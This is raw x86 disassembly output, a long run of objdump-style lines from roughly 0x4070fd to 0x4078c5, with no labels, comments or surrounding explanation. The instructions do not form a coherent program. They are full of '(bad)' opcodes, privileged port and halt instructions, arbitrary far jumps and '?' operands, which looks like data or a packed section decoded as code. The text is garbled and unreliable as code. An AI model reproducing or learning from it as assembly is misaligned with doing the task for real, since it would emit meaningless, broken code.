  4070fd:	mov    dh,0xe0
  4070ff:	mov    ds:0x4da1db4e,al
  407104:	bound  edi,QWORD PTR [esi-0x39]
  407107:	in     eax,dx
  407108:	cbw    
  40710a:	add    DWORD PTR [ecx+0x14],eax
  40710d:	add    esp,DWORD PTR [ebp+0x35b47dcd]
  407113:	jp     0x407173
  407115:	popf   
  407116:	and    al,0x9d
  407118:	mov    ah,0xe7
  40711a:	test   al,0xa7
  40711c:	pop    ds
  40711d:	hlt    
  40711e:	out    dx,al
  40711f:	pop    es
  407120:	mov    ?,esp
  407122:	sbb    eax,DWORD PTR [ebx]
  407124:	out    dx,al
  407125:	push   ds
  407126:	sbb    BYTE PTR [ebx],dl
  407128:	das    
  407129:	not    dh
  40712b:	jl     0x4070f1
  40712d:	or     BYTE PTR [edi+edx*2+0x443009d0],ch
  407134:	cmp    al,BYTE PTR [ebx]
  407136:	mov    edx,0x7f036b53
  40713b:	popa   
  40713c:	add    al,0xc4
  40713e:	mov    edx,0x1fc18514
  407143:	stos   DWORD PTR es:[edi],eax
  407144:	nop
  407145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407146:	(bad)  
  407147:	push   ebp
  407148:	aaa    
  407149:	daa    
  40714a:	xchg   ecx,eax
  40714b:	jmp    0x5139:0x8ae0d086
  407152:	cmp    ah,BYTE PTR [esi+0x41]
  407155:	push   0xffffff8f
  407157:	push   cs
  407158:	(bad)  
  407159:	xchg   ecx,eax
  40715a:	cs xchg ebx,eax
  40715c:	test   al,0xff
  40715e:	push   cs
  40715f:	jge    0x40713b
  407161:	jne    0x4070eb
  407163:	aaa    
  407164:	inc    ebx
  407165:	push   cs
  407166:	jmp    0xd9b3:0xcb630866
  40716d:	out    dx,eax
  40716e:	cwde   
  40716f:	inc    ebp
  407170:	mov    dl,0x98
  407172:	retf   
  407173:	cmp    dl,bh
  407175:	scas   al,BYTE PTR es:[edi]
  407176:	loope  0x407158
  407178:	mov    ds:0x388d9390,eax
  40717d:	pop    ebx
  40717e:	jo     0x4071f4
  407180:	aam    0xdb
  407182:	popa   
  407183:	std    
  407184:	stc    
  407185:	cmp    al,0x50
  407187:	push   cs
  407188:	int3   
  407189:	pop    ds
  40718a:	retf   0x6ce6
  40718d:	leave  
  40718e:	ds aad 0x1a
  407191:	rcr    BYTE PTR [ecx+0x6a12209d],cl
  407197:	test   DWORD PTR [ebx-0x32],ebx
  40719a:	or     bh,BYTE PTR ds:0x4d19dda1
  4071a0:	retf   
  4071a1:	ret    
  4071a2:	mov    cl,0x46
  4071a4:	sahf   
  4071a5:	iret   
  4071a6:	rcr    BYTE PTR [edi],cl
  4071a8:	push   es
  4071a9:	add    eax,0xf6fcb941
  4071ae:	mov    ebp,0x798735b0
  4071b3:	dec    edx
  4071b4:	sub    dl,ch
  4071b6:	sar    DWORD PTR [esi+0x54],1
  4071b9:	or     BYTE PTR [edi+0x23d7b1df],al
  4071bf:	aad    0x30
  4071c1:	mov    ds:0x3921ec0e,eax
  4071c6:	adc    BYTE PTR [esi],ah
  4071c8:	in     eax,0x8a
  4071ca:	add    ebx,DWORD PTR [esp+ebp*1+0x9a34475]
  4071d1:	mov    esp,0x8f8d0d14
  4071d6:	aas    
  4071d7:	aam    0x42
  4071d9:	push   ecx
  4071da:	mov    al,ds:0x851f1696
  4071df:	sbb    bl,BYTE PTR [eax+edx*2]
  4071e2:	mov    edi,0x5488532a
  4071e7:	mov    edi,0x6242c4ed
  4071ec:	bound  edx,QWORD PTR [ebx]
  4071ee:	outs   dx,BYTE PTR ds:[esi]
  4071ef:	and    edi,ebp
  4071f1:	imul   esi,DWORD PTR [ecx-0x53],0x8566a3f5
  4071f8:	jecxz  0x40723f
  4071fa:	jmp    0x4071b9
  4071fc:	sbb    DWORD PTR [edx-0x7dab60f5],esp
  407202:	imul   esi,DWORD PTR [edi-0x44d1b399],0x71
  407209:	jge    0x40723d
  40720b:	gs push 0x8163afac
  407211:	js     0x4071fd
  407213:	popa   
  407214:	xchg   BYTE PTR [edx-0x6],ah
  407217:	(bad)  
  407218:	(bad)  
  407219:	xchg   esp,eax
  40721a:	cs (bad) 
  40721d:	fdivr  st(7),st
  40721f:	sub    al,dh
  407221:	nop
  407222:	ud0    ecx,ebx
  407225:	push   0xfffffff9
  407227:	test   edx,esi
  407229:	mov    dh,0x4a
  40722b:	repnz cli 
  40722d:	loop   0x4071e5
  40722f:	nop
  407230:	(bad)  
  407231:	lods   eax,DWORD PTR ds:[esi]
  407232:	inc    ecx
  407233:	push   eax
  407234:	mov    bl,0xf4
  407236:	push   ebx
  407237:	loop   0x4071c1
  407239:	fisub  DWORD PTR [ecx-0x23]
  40723c:	cmp    dh,BYTE PTR [ecx-0x3dfdc60e]
  407242:	inc    edi
  407243:	scas   al,BYTE PTR es:[edi]
  407244:	jb     0x4072ad
  407246:	mov    esi,0x35ef6b30
  40724b:	xor    al,0x9
  40724d:	ds retf 
  40724f:	addr16 push 0x32
  407252:	scas   al,BYTE PTR es:[edi]
  407253:	xchg   ebp,eax
  407254:	mov    al,BYTE PTR [esi-0x1f337849]
  40725a:	xor    edi,esi
  40725c:	sub    esp,DWORD PTR [edi+0x7ecc6a93]
  407262:	ss inc edx
  407264:	sub    esi,DWORD PTR [eax]
  407266:	pop    es
  407267:	ror    al,cl
  407269:	pop    esp
  40726a:	fmul   DWORD PTR [esi+0x3c]
  40726d:	xchg   esi,eax
  40726e:	bound  eax,QWORD PTR [bx+si]
  407271:	jl     0x407215
  407273:	enter  0xd2dc,0xc9
  407277:	daa    
  407278:	hlt    
  407279:	in     eax,0xe1
  40727b:	push   edx
  40727c:	outs   dx,BYTE PTR ds:[esi]
  40727d:	mov    esp,0xc9099fd2
  407282:	test   BYTE PTR [edi+0x684ab87c],ah
  407288:	jno    0x40722a
  40728a:	daa    
  40728b:	sti    
  40728c:	fst    st(3)
  40728e:	pop    ebx
  40728f:	or     edi,esp
  407291:	fstp   TBYTE PTR [edi+0x71]
  407294:	in     eax,0xa4
  407296:	push   ebx
  407297:	dec    esi
  407298:	mov    ds:0xb23df960,eax
  40729d:	push   0x6c582068
  4072a2:	shr    BYTE PTR [esi],cl
  4072a4:	inc    ebp
  4072a5:	and    BYTE PTR [ebx+0x51526c04],0x58
  4072ac:	sub    edi,edx
  4072ae:	adc    DWORD PTR [esi],eax
  4072b0:	mov    bl,0xb9
  4072b2:	push   es
  4072b3:	inc    eax
  4072b4:	out    0x68,eax
  4072b6:	mov    edi,0x19dfffac
  4072bb:	test   al,0x74
  4072bd:	sbb    al,BYTE PTR [ecx-0x2b054e9c]
  4072c3:	add    dh,ch
  4072c5:	das    
  4072c6:	jmp    0x9172:0x37301ee0
  4072cd:	mov    ds:0xe77e4c3e,eax
  4072d2:	dec    edi
  4072d3:	scas   eax,DWORD PTR es:[edi]
  4072d4:	call   0x6d76b554
  4072d9:	mov    dh,0xb8
  4072db:	xchg   ebx,eax
  4072dc:	xchg   DWORD PTR [ecx+esi*4+0x30a4ca4f],esp
  4072e3:	mov    edi,DWORD PTR [edx-0x47]
  4072e6:	push   ss
  4072e7:	ja     0x40734a
  4072e9:	push   DWORD PTR [eax+0x74]
  4072ec:	inc    esi
  4072ed:	lods   al,BYTE PTR ds:[esi]
  4072ee:	mul    esp
  4072f0:	and    dl,BYTE PTR [eax*8+0x26536b18]
  4072f7:	pusha  
  4072f8:	inc    edx
  4072f9:	ins    DWORD PTR es:[edi],dx
  4072fa:	scas   al,BYTE PTR es:[edi]
  4072fb:	addr16 aam 0xa0
  4072fe:	int3   
  4072ff:	stc    
  407300:	into   
  407301:	xchg   ebp,eax
  407302:	fs leave 
  407304:	stos   BYTE PTR es:[edi],al
  407305:	sbb    dl,BYTE PTR [edx-0x40a5ad1b]
  40730b:	inc    eax
  40730c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40730d:	in     al,dx
  40730e:	mov    ch,0x3f
  407310:	hlt    
  407311:	out    0x7a,eax
  407313:	mov    bl,0x4f
  407315:	pushf  
  407316:	ss sbb eax,0x6fc6349b
  40731c:	popa   
  40731d:	jp     0x4072f4
  40731f:	(bad)  
  407320:	cmc    
  407321:	cmp    al,0x56
  407323:	pop    ecx
  407324:	dec    esp
  407325:	sbb    BYTE PTR [ebx+0x20],cl
  407328:	int3   
  407329:	fs loop 0x407331
  40732c:	xchg   BYTE PTR [ecx-0x68a117a9],al
  407332:	js     0x407356
  407334:	adc    esp,edx
  407336:	mov    ch,0xc8
  407338:	xor    BYTE PTR [edi+0x6b],bl
  40733b:	xchg   ebx,eax
  40733c:	or     DWORD PTR [ebx+0xfb948f7],edx
  407342:	push   eax
  407343:	xor    DWORD PTR [eax],edx
  407345:	cmp    eax,0x32661fe0
  40734a:	bound  ebx,QWORD PTR [ebx+ebp*1]
  40734d:	mov    ebp,edx
  40734f:	mov    BYTE PTR [edx-0x1a],0xde
  407353:	out    dx,eax
  407354:	cdq    
  407355:	mov    dh,0x45
  407357:	popf   
  407358:	enter  0xb13b,0x4d
  40735c:	jmp    0x38bc:0x76de32a6
  407363:	push   edi
  407364:	cdq    
  407365:	cmc    
  407366:	call   0x7ed53b42
  40736b:	ficomp DWORD PTR [edi-0x2a7b04d4]
  407371:	stos   BYTE PTR es:[edi],al
  407372:	cmc    
  407373:	xor    dl,BYTE PTR [esp+ebx*1+0x5d]
  407377:	int3   
  407378:	xchg   DWORD PTR [ebx-0xe],edx
  40737b:	test   al,0xb9
  40737d:	inc    ecx
  40737e:	push   es
  40737f:	ficom  DWORD PTR [eax+0x58936aad]
  407385:	nop
  407386:	cmc    
  407387:	sbb    BYTE PTR [ebx+0x71507f9f],ah
  40738d:	pop    esi
  40738e:	mov    esi,0x68f27478
  407393:	inc    eax
  407394:	push   cs
  407395:	inc    edx
  407396:	stc    
  407397:	mov    esp,0x8a554241
  40739c:	arpl   WORD PTR [edi+ebx*8-0x30],si
  4073a0:	xor    eax,0xc982fa6c
  4073a5:	test   edi,ebx
  4073a7:	sar    BYTE PTR [ebp+0x19b106d1],cl
  4073ad:	fimul  DWORD PTR [edi]
  4073af:	fiadd  DWORD PTR [esi-0x540a6466]
  4073b5:	ds pop ss
  4073b7:	xor    BYTE PTR [ebx],cl
  4073b9:	add    al,0x1
  4073bb:	cmp    eax,esp
  4073bd:	ret    0x4ce3
  4073c0:	dec    ebx
  4073c1:	outs   dx,BYTE PTR ds:[esi]
  4073c2:	xchg   BYTE PTR [esi-0x138313f2],bl
  4073c8:	jbe    0x407378
  4073ca:	sub    DWORD PTR fs:[edx-0x571d38f4],0x57f36e42
  4073d5:	(bad)  
  4073d6:	push   esi
  4073d7:	push   cs
  4073d8:	push   ss
  4073d9:	pop    ss
  4073da:	jae    0x40743a
  4073dc:	pop    ebp
  4073dd:	jecxz  0x40741d
  4073df:	pop    ecx
  4073e0:	sbb    al,0xea
  4073e2:	cmp    dl,cl
  4073e4:	lock hlt 
  4073e6:	jmp    0x4073d2
  4073e8:	adc    edx,0x41
  4073eb:	scas   al,BYTE PTR es:[edi]
  4073ec:	sbb    al,0xfe
  4073ee:	pop    esp
  4073ef:	scas   eax,DWORD PTR es:[edi]
  4073f0:	mov    ch,0xf9
  4073f2:	sub    BYTE PTR ss:[ecx],bl
  4073f5:	sbb    ebp,ebx
  4073f7:	add    al,0x15
  4073f9:	jmp    0xb3ac:0x13ff8974
  407400:	aad    0x3e
  407402:	inc    ebp
  407403:	jmp    DWORD PTR [esi-0x82a8ba]
  407409:	dec    ebx
  40740a:	in     eax,dx
  40740b:	or     eax,ebp
  40740d:	mov    dl,0x10
  40740f:	ins    BYTE PTR es:[edi],dx
  407410:	mov    edx,DWORD PTR [ecx+0x42]
  407413:	jmp    0x40744f
  407415:	dec    esp
  407416:	jge    0x4073d9
  407418:	sub    ah,bl
  40741a:	sub    al,0xd9
  40741c:	ss add al,0xa2
  40741f:	adc    BYTE PTR [esi-0x65],bl
  407422:	ins    BYTE PTR es:[edi],dx
  407423:	sub    BYTE PTR [edi],dl
  407425:	call   0x6477:0x458a0ff0
  40742c:	sub    eax,DWORD PTR [ecx+0x531bdd99]
  407432:	push   ebp
  407433:	nop
  407434:	or     al,BYTE PTR [edi-0x49e0df2f]
  40743a:	test   BYTE PTR [esi],0xee
  40743d:	add    ch,ch
  40743f:	(bad)  
  407441:	sub    al,0x80
  407443:	dec    ebx
  407444:	and    WORD PTR [edx-0x48],bx
  407448:	daa    
  407449:	add    esp,DWORD PTR [ebx+0x1bbea9d1]
  40744f:	scas   eax,DWORD PTR es:[edi]
  407450:	inc    ebx
  407451:	dec    ebp
  407452:	lds    eax,FWORD PTR [edx+0x3e]
  407455:	ror    ah,0x2a
  407458:	and    esi,DWORD PTR [ebp-0x3d430e79]
  40745e:	push   edx
  40745f:	push   es
  407460:	xchg   BYTE PTR [edx],bh
  407462:	(bad)  
  407464:	mov    esp,0x3b5ede91
  407469:	push   ecx
  40746a:	inc    ecx
  40746b:	aas    
  40746c:	xchg   ebx,eax
  40746d:	ins    DWORD PTR es:[edi],dx
  40746e:	mov    al,ds:0xdb0b2399
  407473:	pusha  
  407474:	ror    edx,0x46
  407477:	ffreep st(5)
  407479:	push   ebp
  40747a:	loopne 0x4074b2
  40747c:	push   ecx
  40747d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40747e:	imul   ch
  407480:	adc    esp,DWORD PTR [eax+0x37df7d10]
  407486:	sub    eax,0x1cb3af76
  40748b:	out    0xad,al
  40748d:	out    0xa2,al
  40748f:	mov    ds:0xb25f4853,eax
  407494:	dec    ebp
  407495:	cmc    
  407496:	xor    eax,0xc36d37e8
  40749b:	jecxz  0x4074b1
  40749d:	inc    ebp
  40749e:	icebp  
  40749f:	push   ss
  4074a0:	xchg   esp,eax
  4074a1:	or     DWORD PTR [eax+0x7],ebp
  4074a4:	mov    ds:0x531f2de9,al
  4074a9:	or     esp,ebp
  4074ab:	lahf   
  4074ac:	aas    
  4074ad:	pop    ebx
  4074ae:	outs   dx,BYTE PTR ds:[esi]
  4074af:	fdivr  QWORD PTR [edi]
  4074b1:	(bad)  
  4074b2:	sub    al,0x17
  4074b4:	cdq    
  4074b5:	dec    edx
  4074b6:	js     0x4074e6
  4074b8:	int3   
  4074b9:	sub    ch,BYTE PTR [ecx-0x1291591b]
  4074bf:	sub    BYTE PTR [ebp+0x7d4068ae],al
  4074c5:	mov    dh,0xd8
  4074c7:	fdivr  st,st(2)
  4074c9:	cmp    edi,DWORD PTR [ebp+0x479ed176]
  4074cf:	out    dx,al
  4074d0:	dec    eax
  4074d1:	es xor ah,bh
  4074d4:	daa    
  4074d5:	aaa    
  4074d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d7:	imul   DWORD PTR [edi-0x5f8e192]
  4074dd:	retw   0x5ff3
  4074e1:	std    
  4074e2:	inc    eax
  4074e3:	mov    BYTE PTR [eax+0x483f3732],ah
  4074e9:	(bad)  
  4074ea:	fcom   QWORD PTR [eax+0x5878ab4f]
  4074f0:	stos   BYTE PTR es:[edi],al
  4074f1:	inc    ebp
  4074f2:	push   cs
  4074f3:	adc    ch,bl
  4074f5:	fadd   QWORD PTR [esi]
  4074f7:	push   ss
  4074f8:	ret    
  4074f9:	cmp    esp,DWORD PTR [edx]
  4074fb:	(bad)  
  4074fc:	jp     0x407538
  4074fe:	dec    eax
  4074ff:	mov    bl,0x5e
  407501:	pop    ss
  407502:	mov    al,ds:0x7f8bbf19
  407507:	fidivr WORD PTR [esi-0x6701d919]
  40750d:	cs sbb al,0x65
  407510:	push   cs
  407511:	mov    edi,0xa1f0fdd7
  407516:	fs ins DWORD PTR es:[edi],dx
  407518:	push   edi
  407519:	sbb    DWORD PTR [ebp+0x10edc60c],edi
  40751f:	gs lock mov dl,0xfe
  407523:	inc    ecx
  407524:	mov    cl,0x3f
  407526:	loope  0x4074c1
  407528:	pusha  
  407529:	or     bh,al
  40752b:	push   ecx
  40752c:	xor    DWORD PTR [esi+0x54],esp
  40752f:	xchg   ecx,eax
  407530:	push   edx
  407531:	popa   
  407532:	enter  0xb833,0x67
  407536:	scas   eax,DWORD PTR es:[edi]
  407537:	popa   
  407538:	pop    esp
  407539:	ret    
  40753a:	mov    eax,0x22ac892d
  40753f:	pop    es
  407540:	outs   dx,DWORD PTR ds:[esi]
  407541:	xchg   DWORD PTR [esi-0x76],eax
  407544:	dec    esp
  407545:	mov    ebp,0xda02b7f6
  40754a:	mov    ch,BYTE PTR [edi]
  40754c:	lock pop es
  40754e:	aas    
  40754f:	icebp  
  407550:	cmp    al,0x8e
  407552:	out    dx,al
  407553:	dec    ebx
  407554:	mov    ebp,0x460dc324
  407559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40755a:	dec    ebp
  40755b:	scas   al,BYTE PTR es:[edi]
  40755c:	(bad)  
  40755d:	adc    edx,edi
  40755f:	cmp    BYTE PTR [edx],0x6
  407562:	xchg   BYTE PTR [eax],bh
  407564:	pop    edi
  407565:	mov    bh,0x80
  407567:	dec    ebp
  407568:	push   ebx
  407569:	icebp  
  40756a:	cmp    DWORD PTR [edi+0x2],eax
  40756d:	(bad)  
  40756e:	sahf   
  40756f:	call   0x3938:0x445a10f2
  407576:	jg     0x4075a4
  407578:	inc    ecx
  407579:	cmp    ebp,DWORD PTR [ebx+0x3a70c68b]
  40757f:	cs add eax,0x709da374
  407585:	pop    ebp
  407586:	sbb    DWORD PTR [ecx],eax
  407588:	mov    bl,0x0
  40758a:	enter  0x4778,0x20
  40758e:	stos   BYTE PTR es:[edi],al
  40758f:	sub    eax,0x400a53a7
  407594:	imul   esp,DWORD PTR [ebx],0xffffff99
  407597:	out    0x3f,eax
  407599:	gs mov dh,0x27
  40759c:	bound  esp,QWORD PTR ds:0x8e178643
  4075a2:	imul   edx,DWORD PTR [eax+0x6b],0xffffff92
  4075a6:	mov    BYTE PTR [ebp+0x5b],dh
  4075a9:	out    dx,al
  4075aa:	push   ss
  4075ab:	out    dx,al
  4075ac:	mov    ebx,0xe6255679
  4075b1:	jp     0x40759b
  4075b3:	hlt    
  4075b4:	sar    DWORD PTR [ecx],0x29
  4075b7:	frstor [ebx-0x5d]
  4075ba:	mov    edi,0x2c4eddb0
  4075bf:	push   0x39dc552f
  4075c4:	or     ecx,DWORD PTR [edi+0xe]
  4075c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c8:	add    dl,dh
  4075ca:	pop    es
  4075cb:	js     0x4075a4
  4075cd:	pop    ebx
  4075ce:	add    DWORD PTR [ebx],esp
  4075d0:	mov    cl,0xdc
  4075d2:	mov    ch,0x7a
  4075d4:	sahf   
  4075d5:	or     DWORD PTR ds:0xa3f92542,ebx
  4075db:	mov    ch,0xd8
  4075dd:	aas    
  4075de:	sub    DWORD PTR cs:[ebx+0x200daa06],edi
  4075e5:	inc    esi
  4075e6:	xchg   esi,eax
  4075e7:	mov    edi,0x7e2c1db4
  4075ec:	fadd   st,st(4)
  4075ee:	mov    esp,0xfa7307e9
  4075f3:	mov    al,0xf3
  4075f5:	dec    edi
  4075f6:	and    ah,BYTE PTR [ebp+0x16]
  4075f9:	pop    ds
  4075fa:	int3   
  4075fb:	retf   
  4075fc:	das    
  4075fd:	call   0x9e1:0x333902cc
  407604:	inc    esp
  407605:	nop
  407606:	sti    
  407607:	into   
  407608:	push   0x91a6a0c
  40760d:	mov    ebx,0xa8811d99
  407612:	xchg   ebx,eax
  407613:	rcl    DWORD PTR [edx+0xd53542f],cl
  407619:	mov    eax,0xe84e42a4
  40761e:	xchg   esi,eax
  40761f:	aam    0xd9
  407621:	xor    ah,ah
  407623:	jno    0x407669
  407625:	or     esp,DWORD PTR [ecx+0x78]
  407628:	popa   
  407629:	adc    DWORD PTR [edx-0x4293e77c],edx
  40762f:	loopne 0x4075fe
  407631:	hlt    
  407632:	sbb    ecx,esp
  407634:	cmp    BYTE PTR [ebx],cl
  407636:	scas   al,BYTE PTR es:[edi]
  407637:	dec    edx
  407638:	adc    BYTE PTR [edi+0x3b],al
  40763b:	add    eax,0x521f9fc5
  407640:	sahf   
  407641:	push   es
  407642:	xchg   ebp,eax
  407643:	push   esi
  407644:	xor    BYTE PTR [esi+ebx*4-0x60],dh
  407648:	(bad)  
  407649:	int    0xa7
  40764b:	es sbb al,0xe5
  40764e:	fnsave [edi+0x608d261]
  407654:	in     al,dx
  407655:	cmp    BYTE PTR [edi+0xf],0x71
  407659:	xor    DWORD PTR [eax-0x76],esp
  40765c:	and    al,0xbf
  40765e:	shr    BYTE PTR [edx-0x48],cl
  407661:	or     eax,0x1475b52a
  407666:	fisubr DWORD PTR [eax-0x21]
  407669:	mov    al,0x9c
  40766b:	(bad)  
  40766c:	cmc    
  40766d:	call   0x6013:0xfbc18706
  407674:	repnz adc ah,0x4a
  407678:	pop    ebp
  407679:	(bad)  [edi+0x446423bc]
  40767f:	jb     0x40763f
  407681:	ret    0xf32f
  407684:	sbb    DWORD PTR [ecx],ebp
  407686:	pop    ecx
  407687:	sub    DWORD PTR [ecx],esi
  407689:	mov    dh,0x39
  40768b:	es js  0x407615
  40768e:	sbb    edi,DWORD PTR [esi-0xe]
  407691:	and    ecx,DWORD PTR [esp+esi*2+0x3a3eb94f]
  407698:	bound  esp,QWORD PTR [edi-0x37750cb0]
  40769e:	fst    QWORD PTR [eax]
  4076a0:	lahf   
  4076a1:	cmp    al,0xef
  4076a3:	sub    al,BYTE PTR [ebx]
  4076a5:	add    BYTE PTR [esi],bh
  4076a7:	in     eax,0x4b
  4076a9:	cld    
  4076aa:	jmp    0x407631
  4076ac:	retf   
  4076ad:	je     0x407674
  4076af:	dec    BYTE PTR [edi]
  4076b1:	jmp    0x5114de1e
  4076b6:	and    ah,0x22
  4076b9:	(bad)  
  4076ba:	xor    edi,DWORD PTR [edi-0x728c72d7]
  4076c0:	xor    ah,cl
  4076c2:	call   0x68ca:0x93e7c64
  4076c9:	add    DWORD PTR [ecx-0x55],0xab8dcee2
  4076d0:	cwde   
  4076d1:	or     al,0xef
  4076d3:	stc    
  4076d4:	xchg   ecx,eax
  4076d5:	retf   0x25d0
  4076d8:	repz shr DWORD PTR [ebp-0x12],0xe9
  4076dd:	push   0x8ba3e473
  4076e2:	outs   dx,BYTE PTR ds:[esi]
  4076e3:	sub    cl,BYTE PTR [ecx-0x5817699c]
  4076e9:	mov    ebx,0xf64fe368
  4076ee:	stos   BYTE PTR es:[edi],al
  4076ef:	sub    DWORD PTR [edi+0x252d803a],ebx
  4076f5:	fwait
  4076f6:	fs dec ebx
  4076f8:	xor    dh,BYTE PTR [ecx-0x729b754e]
  4076fe:	cs fucom st(5)
  407701:	(bad)  
  407702:	cli    
  407703:	or     BYTE PTR [ecx+0x25],dl
  407706:	cdq    
  407707:	(bad)  
  407708:	cmp    BYTE PTR [eax+ecx*8-0x35f908c2],al
  40770f:	(bad)  
  407711:	mov    ah,0xc6
  407713:	mov    BYTE PTR [edi+0x10],dl
  407716:	xchg   edx,eax
  407717:	adc    DWORD PTR [ecx-0x5d],ebp
  40771a:	fild   QWORD PTR [esi]
  40771c:	stos   DWORD PTR es:[edi],eax
  40771d:	push   ds
  40771e:	pushf  
  40771f:	xchg   ebp,eax
  407720:	pop    esi
  407721:	(bad)  
  407722:	fnsave [ebp+0x70e568dd]
  407728:	test   al,0x5b
  40772a:	mov    eax,es:0x5a41d341
  407730:	mov    ebx,0xcdafb3cd
  407735:	in     eax,0xaa
  407737:	data16 mov dl,0x95
  40773a:	aaa    
  40773b:	dec    esp
  40773c:	call   FWORD PTR [edi+0x17]
  40773f:	or     BYTE PTR [edi+0x69],0xa7
  407743:	inc    esi
  407744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407745:	jmp    0x14098e1f
  40774a:	inc    ecx
  40774b:	sbb    eax,0x4e4bb7da
  407750:	or     dl,ah
  407752:	push   ss
  407753:	stc    
  407754:	jp     0x40772f
  407756:	(bad)  
  407757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407758:	sahf   
  407759:	arpl   WORD PTR [edx],bx
  40775b:	outs   dx,DWORD PTR ds:[esi]
  40775c:	test   eax,0xd67dff47
  407761:	in     al,0x13
  407763:	lods   al,BYTE PTR ds:[esi]
  407764:	sbb    DWORD PTR [eax],ecx
  407766:	repnz sub BYTE PTR [ebx],ah
  407769:	xchg   ecx,eax
  40776a:	pop    es
  40776b:	aad    0xa8
  40776d:	sub    eax,DWORD PTR [ecx+0x1cbcdfd9]
  407773:	mov    bh,0x1b
  407775:	mov    ch,0x15
  407777:	lock mov ds:0x7926888a,eax
  40777d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40777e:	or     ebx,DWORD PTR [edx-0x2e610e6]
  407784:	cwde   
  407785:	jne    0x407707
  407787:	pop    edx
  407788:	jle    0x4077b8
  40778a:	xor    eax,0xa2d03ac0
  40778f:	ja     0x40779d
  407791:	rcr    DWORD PTR [eax-0x409d555d],cl
  407797:	cdq    
  407798:	loop   0x4077f3
  40779a:	inc    ecx
  40779b:	xchg   edi,eax
  40779c:	jle    0x4077e6
  40779e:	popa   
  40779f:	sbb    esi,DWORD PTR [ecx+0x4ad91961]
  4077a5:	inc    edi
  4077a6:	dec    eax
  4077a7:	add    cl,ch
  4077a9:	out    0x59,eax
  4077ab:	or     dl,BYTE PTR [eax+0x75]
  4077ae:	xchg   DWORD PTR [edi],esp
  4077b0:	sub    BYTE PTR [esi-0x56],ch
  4077b3:	adc    dl,0x83
  4077b6:	adc    al,0x17
  4077b8:	jmp    0xdb13:0x3e3135cd
  4077bf:	fdiv   QWORD PTR [esi-0x52]
  4077c2:	inc    esi
  4077c3:	cmp    ecx,DWORD PTR [ebx]
  4077c5:	iret   
  4077c6:	add    al,0x2
  4077c8:	in     eax,0x64
  4077ca:	xchg   edi,eax
  4077cb:	push   0x39df2262
  4077d0:	add    ch,BYTE PTR [esi]
  4077d2:	mov    ecx,0x3017ed27
  4077d7:	add    al,BYTE PTR [eax-0x3f]
  4077da:	mov    ch,0x86
  4077dc:	add    BYTE PTR ds:0xa2ca6448,al
  4077e2:	test   al,0x90
  4077e4:	bound  esi,QWORD PTR [eax-0x51f675ec]
  4077ea:	add    eax,ebx
  4077ec:	mov    ecx,ebp
  4077ee:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4077f0:	out    dx,al
  4077f1:	imul   ecx,ebp,0x7e
  4077f4:	cld    
  4077f5:	mov    ah,0x98
  4077f7:	push   ss
  4077f8:	mov    DWORD PTR ds:0xc14b8f02,esp
  4077fe:	sub    BYTE PTR [ebx],cl
  407800:	cwde   
  407801:	jg     0x4077f1
  407803:	ja     0x4077b6
  407805:	mov    WORD PTR [edi+0x4f9024ed],es
  40780b:	cli    
  40780c:	clc    
  40780d:	scas   eax,DWORD PTR es:[edi]
  40780e:	cmp    ch,dh
  407810:	jbe    0x407850
  407812:	mov    ds,WORD PTR [esi-0x7efae4fc]
  407818:	push   cs
  407819:	(bad)  
  40781a:	in     eax,0xee
  40781c:	fcmovnbe st,st(5)
  40781e:	cmp    edi,DWORD PTR [ebx-0x7a9ebc80]
  407824:	les    ecx,FWORD PTR [esi-0x32]
  407827:	mov    dh,0x72
  407829:	je     0x40786c
  40782b:	dec    edx
  40782c:	or     eax,0x2cf40861
  407831:	jmp    0x3184:0xa97b6db9
  407838:	push   ss
  407839:	stos   DWORD PTR es:[edi],eax
  40783a:	daa    
  40783b:	ins    BYTE PTR es:[edi],dx
  40783c:	js     0x40786d
  40783e:	(bad)  
  40783f:	mov    cl,0xb8
  407841:	cmp    BYTE PTR [edi],0xde
  407844:	(bad)  [ebp-0x61]
  407847:	and    eax,0x1f984eeb
  40784c:	enter  0x62dc,0xa
  407850:	adc    eax,DWORD PTR [ecx]
  407852:	cli    
  407853:	or     eax,0x2ee92f73
  407858:	das    
  407859:	push   eax
  40785a:	push   cs
  40785b:	jmp    0x407890
  40785d:	test   al,0x9b
  40785f:	adc    esi,ebx
  407861:	jge    0x40789c
  407863:	fsub   DWORD PTR [eax]
  407865:	mov    WORD PTR [esi-0x71],?
  407868:	mov    gs,eax
  40786a:	sub    al,BYTE PTR [ecx-0x2d6bc54a]
  407870:	(bad)  
  407871:	in     al,dx
  407872:	xlat   BYTE PTR ds:[ebx]
  407873:	daa    
  407874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407875:	out    0x81,al
  407877:	pop    ss
  407878:	jmp    esp
  40787a:	jb     0x40781d
  40787c:	push   0xcb402a7b
  407881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407882:	adc    eax,0x9d0d3a06
  407887:	mov    DWORD PTR [eax+ecx*2+0x6f496183],eax
  40788e:	outs   dx,DWORD PTR ds:[esi]
  40788f:	sbb    BYTE PTR [edi+eax*8+0x53],0x89
  407894:	xor    esp,esp
  407896:	inc    eax
  407897:	push   ds
  407898:	inc    ebp
  407899:	xchg   BYTE PTR [eax-0x7b],bh
  40789c:	into   
  40789d:	rcl    BYTE PTR [eax],cl
  40789f:	jae    0x407911
  4078a1:	in     eax,dx
  4078a2:	mov    DWORD PTR [esi],esi
  4078a4:	mov    edx,0xbc4c9f6c
  4078a9:	and    dl,cl
  4078ab:	inc    esi
  4078ac:	hlt    
  4078ad:	or     DWORD PTR [ebx],ebp
  4078af:	mov    esi,0x5c8d9ee9
  4078b4:	inc    esp
  4078b5:	jl     0x407920
  4078b7:	div    DWORD PTR [ebx]
  4078b9:	rcl    BYTE PTR [esi+0x18],0x3b
  4078bd:	ret    0x57b
  4078c0:	xor    DWORD PTR [edi+ebx*4],edi
  4078c3:	mov    al,0x74
  4078c5:	sar    BYTE PTR [ebx-0x3dedc2fd],cl
